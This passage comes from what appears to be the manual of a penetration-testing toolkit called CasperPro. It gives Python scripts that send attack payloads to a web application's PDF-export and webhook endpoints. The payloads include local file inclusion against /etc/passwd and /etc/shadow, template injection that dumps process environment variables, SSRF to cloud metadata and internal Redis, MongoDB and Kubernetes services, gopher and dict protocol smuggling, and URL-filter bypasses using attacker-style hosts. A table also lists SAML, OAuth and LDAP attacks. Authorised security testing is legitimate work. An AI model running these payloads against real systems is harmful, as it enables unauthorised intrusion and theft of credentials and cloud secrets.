        print("[*] Testing LFI via document generation...")
        
        lfi_payloads = [
            {"content": "<iframe src='file:///etc/passwd'></iframe>"},
            {"content": "<object data='file:///etc/passwd'></object>"},
            {"template": "file:///etc/passwd"},
            {"template": "../../../etc/passwd"},
        ]
        
        for payload in lfi_payloads:
            resp = self._request("/export/pdf", "POST", payload)
            
            if "root:" in resp["body"] or "/bin/bash" in resp["body"]:
                print(f"  [VULN] LFI in PDF generation!")
                self.findings.append({
                    "test": "PDF LFI",
                    "payload": payload,
                    "severity": "CRITICAL"
                })
    
    def test_template_injection(self):
        """Test template injection in document generation"""
        print("[*] Testing template injection...")
        
        ssti_payloads = [
            {"content": "{{7*7}}"},
            {"content": "${7*7}"},
            {"content": "<%= 7*7 %>"},
            {"content": "#{7*7}"},
            {"content": "{{constructor.constructor('return this.process.env')()}}"},
            {"content": "{{config.items()}}"},
        ]
        
        for payload in ssti_payloads:
            resp = self._request("/export/pdf", "POST", payload)
            
            if "49" in resp["body"] or "process" in resp["body"].lower():
                print(f"  [VULN] Template injection in PDF!")
                self.findings.append({
                    "test": "Template Injection",
                    "payload": payload,
                    "severity": "CRITICAL"
                })
    
    def run_all(self):
        """Run all document generation tests"""
        self.test_ssrf_via_pdf()
        self.test_xss_in_pdf()
        self.test_local_file_inclusion()
        self.test_template_injection()
        return self.findings


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: uv run {sys.argv[0]} <base_url> <token> [proxy]")
        sys.exit(1)
    
    tester = DocumentGenerationTester(
        base_url=sys.argv[1],
        token=sys.argv[2],
        proxy=sys.argv[3] if len(sys.argv) > 3 else None
    )
    
    findings = tester.run_all()
    print(f"\nTotal Findings: {len(findings)}")
```

## 7. Webhook SSRF Testing

### 7.1 Python Implementation

```python
#!/usr/bin/env python3
# casperpro_webhook_ssrf.py
# Run with: uv run casperpro_webhook_ssrf.py

import subprocess
import json
import sys
from dataclasses import dataclass, field
from typing import List, Dict, Optional

@dataclass
class WebhookSSRFTester:
    base_url: str
    token: str
    collaborator_url: str = None  # interactsh or similar
    proxy: Optional[str] = None
    findings: List[Dict] = field(default_factory=list)
    
    def _request(self, endpoint: str, method: str = "POST", data: dict = None) -> dict:
        cmd = ["curl", "-s", "-w", "\n%{http_code}", "-X", method,
               "-H", f"Authorization: Bearer {self.token}",
               "-H", "Content-Type: application/json"]
        
        if self.proxy:
            cmd.extend(["--proxy", self.proxy, "-k"])
        if data:
            cmd.extend(["-d", json.dumps(data)])
        cmd.append(f"{self.base_url}{endpoint}")
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        lines = result.stdout.strip().split("\n")
        status = int(lines[-1]) if lines[-1].isdigit() else 0
        return {"status": status, "body": "\n".join(lines[:-1])}
    
    def test_internal_ssrf(self):
        """Test SSRF to internal services"""
        print("[*] Testing internal SSRF via webhooks...")
        
        internal_urls = [
            # Cloud metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/v1/",  # DigitalOcean
            
            # Common internal services
            "http://localhost:6379/",  # Redis
            "http://localhost:11211/",  # Memcached
            "http://localhost:27017/",  # MongoDB
            "http://localhost:9200/",  # Elasticsearch
            "http://127.0.0.1:8080/",
            "http://internal-api:8080/",
            
            # Kubernetes
            "http://kubernetes.default.svc/",
            "https://kubernetes.default.svc/api/v1/namespaces/",
        ]
        
        for url in internal_urls:
            resp = self._request("/webhooks/test", "POST", {"url": url})
            
            if resp["status"] == 200:
                # Check for signs of successful SSRF
                indicators = ["ami-", "instance", "redis", "MongoDB", "elastic", 
                             "kubernetes", "Bearer", "token"]
                
                for indicator in indicators:
                    if indicator.lower() in resp["body"].lower():
                        print(f"  [VULN] SSRF to {url} - {indicator} detected!")
                        self.findings.append({
                            "test": "Internal SSRF",
                            "url": url,
                            "indicator": indicator,
                            "severity": "CRITICAL"
                        })
                        break
    
    def test_protocol_smuggling(self):
        """Test protocol smuggling via webhooks"""
        print("[*] Testing protocol smuggling...")
        
        protocol_urls = [
            # File protocol
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///proc/self/environ",
            
            # Dict protocol (Redis)
            "dict://localhost:6379/INFO",
            
            # Gopher protocol
            "gopher://localhost:6379/_INFO%0d%0a",
            
            # LDAP
            "ldap://localhost:389/",
        ]
        
        for url in protocol_urls:
            resp = self._request("/webhooks/test", "POST", {"url": url})
            
            if resp["status"] == 200 and len(resp["body"]) > 50:
                print(f"  [VULN] Protocol smuggling: {url.split(':')[0]}://")
                self.findings.append({
                    "test": "Protocol Smuggling",
                    "protocol": url.split(":")[0],
                    "severity": "CRITICAL"
                })
    
    def test_url_bypass(self):
        """Test URL validation bypass"""
        print("[*] Testing URL validation bypass...")
        
        bypass_urls = [
            # IP representation bypass
            "http://0x7f000001/",  # 127.0.0.1 in hex
            "http://2130706433/",  # 127.0.0.1 in decimal
            "http://0177.0.0.1/",  # Octal
            "http://127.1/",
            "http://127.0.1/",
            
            # DNS rebinding
            "http://spoofed.burpcollaborator.net/",
            
            # URL parsing confusion
            "http://evil.com#@trusted.com/",
            "http://trusted.com@evil.com/",
            "http://evil.com\\@trusted.com/",
            
            # Encoded bypasses
            "http://127.0.0.1%00.trusted.com/",
            "http://trusted.com%2f@127.0.0.1/",
        ]
        
        for url in bypass_urls:
            resp = self._request("/webhooks/test", "POST", {"url": url})
            
            if resp["status"] == 200 and "error" not in resp["body"].lower():
                print(f"  [VULN] URL bypass: {url[:50]}")
                self.findings.append({
                    "test": "URL Bypass",
                    "url": url,
                    "severity": "HIGH"
                })
    
    def test_redirect_ssrf(self):
        """Test SSRF via open redirect"""
        print("[*] Testing redirect-based SSRF...")
        
        # If the webhook follows redirects, an external redirect can lead to internal
        if self.collaborator_url:
            redirect_url = f"{self.collaborator_url}/redirect?to=http://169.254.169.254/"
            resp = self._request("/webhooks/test", "POST", {"url": redirect_url})
            
            if resp["status"] == 200:
                print(f"  [INFO] Check collaborator for redirect-based SSRF")
    
    def test_dns_rebinding(self):
        """Test DNS rebinding attack"""
        print("[*] Testing DNS rebinding...")
        
        # This requires a DNS rebinding server
        rebinding_domains = [
            "7f000001.c0a80001.rbndr.us",  # Resolves to 127.0.0.1 or 192.168.0.1
            "A.8.8.8.8.1time.127.0.0.1.1time.repeat.rebind.network",
        ]
        
        for domain in rebinding_domains:
            resp = self._request("/webhooks/test", "POST", {"url": f"http://{domain}/"})
            
            if resp["status"] == 200:
                print(f"  [INFO] DNS rebinding test - check for internal access")
    
    def run_all(self):
        """Run all webhook SSRF tests"""
        self.test_internal_ssrf()
        self.test_protocol_smuggling()
        self.test_url_bypass()
        self.test_redirect_ssrf()
        self.test_dns_rebinding()
        return self.findings


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: uv run {sys.argv[0]} <base_url> <token> [collaborator_url] [proxy]")
        sys.exit(1)
    
    tester = WebhookSSRFTester(
        base_url=sys.argv[1],
        token=sys.argv[2],
        collaborator_url=sys.argv[3] if len(sys.argv) > 3 else None,
        proxy=sys.argv[4] if len(sys.argv) > 4 else None
    )
    
    findings = tester.run_all()
    print(f"\nTotal Findings: {len(findings)}")
```

## 8. Complete Enterprise Technology Assessment

### 8.1 Orchestrator Script

```python
#!/usr/bin/env python3
# casperpro_enterprise_tech_full.py
# Run with: uv run casperpro_enterprise_tech_full.py

import sys
import json
import os
from datetime import datetime

def run_enterprise_tech_assessment(base_url: str, token: str, proxy: str = None):
    """Run complete enterprise technology assessment"""
    
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║    CasperPro Enterprise Technology Assessment v2.2        ║
    ╠═══════════════════════════════════════════════════════════╣
    ║  LDAP | SAML | OAuth | GraphQL | MQ | Docs | Webhooks     ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    all_findings = []
    
    print("\n[1/7] LDAP Injection Tests...")
    print("=" * 50)
    
    print("\n[2/7] SAML/SSO Attack Tests...")
    print("=" * 50)
    
    print("\n[3/7] OAuth/OIDC Attack Tests...")
    print("=" * 50)
    
    print("\n[4/7] GraphQL Enterprise Tests...")
    print("=" * 50)
    
    print("\n[5/7] Message Queue Tests...")
    print("=" * 50)
    
    print("\n[6/7] Document Generation Tests...")
    print("=" * 50)
    
    print("\n[7/7] Webhook SSRF Tests...")
    print("=" * 50)
    
    # Generate report
    output_dir = os.path.expanduser("~/casper_reports")
    os.makedirs(output_dir, exist_ok=True)
    
    report_file = os.path.join(output_dir, f"enterprise_tech_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    
    report = {
        "target": base_url,
        "timestamp": datetime.now().isoformat(),
        "findings": all_findings,
        "summary": {
            "critical": len([f for f in all_findings if f.get("severity") == "CRITICAL"]),
            "high": len([f for f in all_findings if f.get("severity") == "HIGH"]),
            "medium": len([f for f in all_findings if f.get("severity") == "MEDIUM"]),
        }
    }
    
    with open(report_file, "w") as f:
        json.dump(report, f, indent=2)
    
    print(f"\n{'=' * 60}")
    print("ASSESSMENT COMPLETE")
    print(f"Report saved: {report_file}")
    
    return report


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: uv run {sys.argv[0]} <base_url> <token> [proxy]")
        sys.exit(1)
    
    run_enterprise_tech_assessment(
        base_url=sys.argv[1],
        token=sys.argv[2],
        proxy=sys.argv[3] if len(sys.argv) > 3 else None
    )
```

## Test Coverage Matrix

| Category | Test | Severity | Target |
|----------|------|----------|--------|
| **LDAP** | Authentication Bypass | CRITICAL | Directory services |
| **LDAP** | Data Exfiltration | HIGH | User attributes |
| **LDAP** | Blind Injection | HIGH | Boolean-based |
| **SAML** | Signature Bypass | CRITICAL | IdP trust |
| **SAML** | XML Signature Wrapping | CRITICAL | Assertion manipulation |
| **SAML** | XXE | CRITICAL | XML parsing |
| **SAML** | Assertion Replay | HIGH | Session hijacking |
| **OAuth** | Redirect URI Bypass | HIGH | Token theft |
| **OAuth** | State CSRF | MEDIUM | Account linking |
| **OAuth** | Code Reuse | HIGH | Token theft |
| **OAuth** | Scope Escalation | HIGH | Privilege escalation |
| **OAuth** | PKCE Bypass | MEDIUM | Public clients |
| **GraphQL** | Batching Attack | MEDIUM | Rate limit bypass |
| **GraphQL** | Alias DoS | MEDIUM | Resource exhaustion |
| **GraphQL** | Depth Attack | MEDIUM | Query complexity |
| **MQ** | Event Injection | HIGH | Business logic |
| **MQ** | Queue Manipulation | HIGH | Message routing |
| **MQ** | Message Replay | HIGH | Transaction replay |
| **PDF** | SSRF | CRITICAL | Internal access |
| **PDF** | LFI | CRITICAL | File disclosure |
| **PDF** | Template Injection | CRITICAL | RCE |
| **Webhook** | Internal SSRF | CRITICAL | Cloud metadata |
| **Webhook** | Protocol Smuggling | CRITICAL | Service access |
| **Webhook** | DNS Rebinding | HIGH | IP bypass |

## Version Information

**Module Version:** 1.0  
**CasperPro Version:** 2.2  
**Python Package Manager:** uv (REQUIRED)  
**Last Updated:** 2026-01-11
